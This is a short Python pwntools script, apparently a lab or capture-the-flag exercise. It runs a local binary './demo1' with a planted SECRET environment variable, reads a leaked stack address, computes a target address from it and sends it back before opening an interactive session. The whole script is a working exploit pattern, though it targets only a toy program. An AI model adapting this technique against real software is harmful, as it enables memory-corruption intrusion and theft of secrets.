from pwn import *
e = ELF("./demo1")
main_addr = e.symbols["main"]
print(hex(main_addr))

p = process(executable = "./demo1", argv=["not_demo1"], env={"SECRET" : "super-secret-password"})

p.sendline(hex(main_addr))

offset = 0x4

p.recvuntil("A random stack variable is at ")

stack_addr = p.recvline()[:-1]

stack_addr = int(stack_addr, 16)

x_addr = stack_addr + offset

p.sendline(hex(x_addr))

p.interactive()
